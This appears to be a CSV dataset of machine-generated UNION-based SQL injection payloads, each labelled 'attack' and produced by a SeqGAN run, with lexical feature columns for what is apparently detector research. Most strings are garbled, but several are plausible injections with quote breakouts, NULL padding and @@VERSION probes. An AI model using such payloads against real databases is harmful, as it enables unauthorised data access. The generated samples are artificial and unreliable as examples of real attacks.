label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"-t'   )    )     )     )    union all all  && where users -- d  =RSION'   )    )    )    union all select null,4909,3990,2263--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,406,127.0,32.0,3.7887226729231096,46.0,12.0,49.0,20.0,0.36220472440944884,0.09448818897637795,0.3858267716535433,0.15748031496062992,2.0,0.0,5.0,0.0,0.0,1.0,0.0,7.0,0.0,0.0,3.0,8.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-4589""  )     )    )    )     )   union all all select null1980,4266,1249,1249,1249,6996,1249,1249,4266,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,407,109.0,24.0,3.8155497796119486,21.0,44.0,27.0,17.0,0.1926605504587156,0.4036697247706422,0.24770642201834864,0.1559633027522936,0.0,1.0,1.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,9.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1""  )   -- 1  )    )  )   union all all all * 11,vers id  (   )    )    )    a    )    union@N select 1646,@@VEERSION -- u,9110sersas'  )   where  (=  )   union *$ union 1  )   -- 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,408,181.0,38.0,3.788163431373111,63.0,14.0,73.0,31.0,0.34806629834254144,0.07734806629834254,0.40331491712707185,0.1712707182320442,1.0,1.0,6.0,0.0,2.0,1.0,0.0,13.0,0.0,0.0,3.0,9.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,4.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack," select null,6737,1249,null,1224,4854,4854--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,409,44.0,19.0,3.9734298462451574,14.0,20.0,2.0,8.0,0.3181818181818182,0.45454545454545453,0.045454545454545456,0.18181818181818182,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-3596""  )   )    )     )   union all all users id  =+.  1 union all  =+2774)  =  )  \g4854 users  =  =  )+  =  '1' union all select 5756,6737,7348,3084,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,410,157.0,34.0,4.133085361149575,46.0,34.0,50.0,27.0,0.2929936305732484,0.21656050955414013,0.3184713375796178,0.17197452229299362,2.0,1.0,1.0,0.0,0.0,6.0,0.0,7.0,0.0,0.0,4.0,10.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-4966%""'  )     )    union all all select Q,7348,8123,1249,4300,7348,4909,3084,4854,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,411,89.0,29.0,4.275722482118004,18.0,40.0,15.0,16.0,0.20224719101123595,0.449438202247191,0.16853932584269662,0.1797752808988764,1.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,9.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-""   )     )     )   union all all all all all 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,412,48.0,11.0,2.4663936562316886,20.0,1.0,22.0,5.0,0.4166666666666667,0.020833333333333332,0.4583333333333333,0.10416666666666667,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,-3879''  )   union all all * from select where,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,413,46.0,24.0,4.052618732590772,26.0,4.0,11.0,5.0,0.5652173913043478,0.08695652173913043,0.2391304347826087,0.10869565217391304,2.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,-'  )     )    )     )    )    '+  (  select ')    )  ve    )     )   union all select #,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,414,88.0,18.0,2.5607195450200546,22.0,0.0,50.0,16.0,0.25,0.0,0.5681818181818182,0.18181818181818182,3.0,0.0,1.0,0.0,0.0,0.0,0.0,10.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-6253' union all * from s is or union 9517 h1917   '1'   1  =  =   1494  '1' where all * 2774O    )    )    aunion all from's users where  =  =  =  1 union  all select from, null,null,null,null,null,1249,'@@VEEEEEES8073Ision  (   )    )  d  =  select us where where union ( from in  (=  =  7815 1   1494  =",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,415,306.0,40.0,4.2395134223768824,137.0,41.0,93.0,35.0,0.4477124183006536,0.13398692810457516,0.30392156862745096,0.11437908496732026,7.0,0.0,1.0,0.0,2.0,9.0,0.0,7.0,0.0,0.0,7.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,4.0,4.0,4.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,"9814's   1   2088 id  2088  '1' union select,n#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,416,47.0,20.0,3.7677799300444157,15.0,14.0,13.0,5.0,0.3191489361702128,0.2978723404255319,0.2765957446808511,0.10638297872340426,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,-9357'  )    )    a  )   union all all all all ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,417,47.0,14.0,2.8140975777553496,18.0,4.0,20.0,5.0,0.3829787234042553,0.0851063829787234,0.425531914893617,0.10638297872340426,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1'    )   )    )    union 1   =  1  1494  )    union 1917  V   ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,418,63.0,13.0,2.4687929298903803,11.0,11.0,35.0,6.0,0.1746031746031746,0.1746031746031746,0.5555555555555556,0.09523809523809523,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-""  )    union all select 1,1249',@@SIr<EERRk'  )    where null  =  1 union all @$$|$$ id    =  2011  )    )    union all select u,7348,ers where where where union all -- from u  $Vsis where  =  =  =  '1't union all all #",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,419,221.0,42.0,4.258125215668108,108.0,15.0,66.0,32.0,0.48868778280542985,0.06787330316742081,0.2986425339366516,0.14479638009049775,4.0,1.0,3.0,0.0,0.0,5.0,0.0,4.0,0.0,0.0,4.0,10.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,5.0,5.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"-""   )   )  )     )   union all select 1,3072,3480,9110,3072#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,420,61.0,24.0,3.849175284088812,14.0,17.0,19.0,11.0,0.22950819672131148,0.2786885245901639,0.3114754098360656,0.18032786885245902,0.0,1.0,1.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-4589""  )   union all null,,7497,8665,7348,7348,6996,8986#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,421,58.0,19.0,3.913379057814288,12.0,28.0,7.0,11.0,0.20689655172413793,0.4827586206896552,0.1206896551724138,0.1896551724137931,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'  )    )    union select 1,9921,3480,9110,5349,,6996,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,422,60.0,23.0,3.9637709052093397,11.0,26.0,12.0,11.0,0.18333333333333332,0.43333333333333335,0.2,0.18333333333333332,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'  )   )   )    as     )   '  )   union all from 3480,7497,vers where id  =  8268 union all select 8123,7348,7348,7348,9988#,8986I#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,423,132.0,33.0,4.1765247396030905,40.0,37.0,38.0,17.0,0.30303030303030304,0.2803030303030303,0.2878787878787879,0.12878787878787878,2.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,7.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"-6667')    )     h  gas 1646  =  '1'+2011  )     gselect 1980  )    )    )     )     )    union id  ( select 4600,3480,4600,7845,v,@ers is48546667,@null,e,6996 4266--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,424,166.0,34.0,4.00041522307435,35.0,49.0,55.0,27.0,0.21084337349397592,0.29518072289156627,0.3313253012048193,0.16265060240963855,3.0,0.0,3.0,0.0,0.0,1.0,0.0,9.0,0.0,0.0,8.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-2263union all all  null,4266,4909,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,425,40.0,17.0,3.8398227820087554,15.0,16.0,4.0,5.0,0.375,0.4,0.1,0.125,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-46008073s  =  1 union all from ,1249,12494600 @s -- e@VEER,e1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,426,62.0,28.0,4.419145289680842,20.0,22.0,11.0,9.0,0.3225806451612903,0.3548387096774194,0.1774193548387097,0.14516129032258066,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1'  )    a  )    )    )    union all select from where @s +ms@&&whereion  s where  )    3480.    )   where union all all  all select *&&--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,427,138.0,29.0,3.7602430239998332,66.0,5.0,49.0,18.0,0.4782608695652174,0.036231884057971016,0.35507246376811596,0.13043478260869565,1.0,0.0,2.0,0.0,1.0,0.0,0.0,6.0,0.0,0.0,0.0,8.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1' i=    all all from users union @s usasesersers where  ( union 1297,6737ersion  =  s union all null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,428,107.0,26.0,3.9770116194459146,67.0,9.0,23.0,8.0,0.6261682242990654,0.08411214953271028,0.21495327102803738,0.07476635514018691,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"-34803596m  )  )  union all all all all select 4854,null,3072,null,4854,7348,9322--,4854,4854,7348,7348,4854,9988,7348,8123,1441,9814,4854',5756,7348,8665----",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,429,158.0,26.0,4.092417322829008,32.0,84.0,12.0,30.0,0.20253164556962025,0.5316455696202531,0.0759493670886076,0.189873417721519,1.0,0.0,7.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,20.0,7.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-8772""  )   )     )   union all all select null,1441,93228123,1441,9814,8123,3059,5756,1224,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,430,97.0,26.0,4.144973025965295,21.0,44.0,17.0,15.0,0.21649484536082475,0.4536082474226804,0.17525773195876287,0.15463917525773196,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,9.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-6253 union all all all 7348,3990,1249,4600,1249,3990,6996,8986,9110,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,431,74.0,20.0,3.9439016737528823,14.0,44.0,5.0,11.0,0.1891891891891892,0.5945945945945946,0.06756756756756757,0.14864864864864866,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack," g1 )   where union all select 1s users where  =  V  )    )    )    union all select null,6737,4300#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,432,100.0,26.0,3.8388212551345453,50.0,10.0,32.0,8.0,0.5,0.1,0.32,0.08,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"-1401""  )     )   union all from us usersionr  (     (     )    )    union all 1494,1297,3084 ,vers  $",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,433,102.0,27.0,3.7189929692813832,35.0,16.0,39.0,12.0,0.3431372549019608,0.1568627450980392,0.38235294117647056,0.11764705882352941,0.0,1.0,1.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-4711""  )    )     )    union all select ,3059,9357,,8123,3059#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,434,63.0,25.0,3.9702524947504596,14.0,20.0,18.0,11.0,0.2222222222222222,0.31746031746031744,0.2857142857142857,0.1746031746031746,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-8772%'  )     )   where union all all select 1297,2446r,1249,1249,3084,9921,4266,1249,1249,1249null,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,435,106.0,29.0,4.257837122525034,27.0,48.0,15.0,16.0,0.25471698113207547,0.4528301886792453,0.14150943396226415,0.1509433962264151,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,10.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-6667%""   )    )   union all h users'  )     )   union u,vers where id  =  )    )    union vselect  from$--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,436,107.0,28.0,3.6754552089876005,47.0,4.0,41.0,15.0,0.4392523364485981,0.037383177570093455,0.38317757009345793,0.14018691588785046,1.0,1.0,3.0,0.0,0.0,1.0,0.0,6.0,1.0,0.0,1.0,4.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"-'  '+  (  select ')   union all all all from usersesers .ersid  =  =  1 select 1917--select all from,1249,verswhere @+",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,437,119.0,32.0,4.20156840467383,67.0,9.0,27.0,16.0,0.5630252100840336,0.07563025210084033,0.226890756302521,0.13445378151260504,3.0,0.0,3.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,2.0,7.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"-35968521)   )     )   union all all select,@@VERSOSIO)    )     union all all select null,9814,8123,1646,9814,5756,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,438,121.0,31.0,4.322610502140119,46.0,32.0,27.0,16.0,0.38016528925619836,0.2644628099173554,0.2231404958677686,0.1322314049586777,0.0,0.0,1.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,7.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1""  )    )    )   union all select @VERSION'      )    )     )    union all select null,4266,null,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,439,103.0,30.0,3.750432915818682,43.0,9.0,38.0,13.0,0.4174757281553398,0.08737864077669903,0.36893203883495146,0.1262135922330097,1.0,1.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
